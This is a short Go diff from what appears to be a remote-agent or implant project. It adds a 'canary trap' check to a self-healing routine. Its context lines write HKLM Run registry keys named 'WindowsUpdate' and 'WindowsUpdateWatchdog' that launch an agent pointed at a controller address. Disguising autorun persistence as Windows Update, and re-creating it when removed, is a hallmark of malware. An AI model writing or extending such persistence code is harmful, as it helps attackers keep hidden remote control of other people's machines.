@@ -445,6 +445,10 @@ func runWmiHeal() {
 	}
 	agentCmd := `"` + agentPath + `" -controller ` + controllerAddr + ` -ca "` + caPath + `"`
 	watchCmd := `"` + agentPath + `" --watch`
+	// Canary trap (pre-repair, like the watch loop): the service healer
+	// repairs these same keys on its own cadence — without auditing first,
+	// its repairs would also blind the verdict.
+	checkRunCanaries(dir)
 	for _, kv := range [][2]string{{"WindowsUpdate", agentCmd}, {"WindowsUpdateWatchdog", watchCmd}} {
 		k, _, err := registry.CreateKey(registry.LOCAL_MACHINE, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.WRITE)
 		if err != nil {
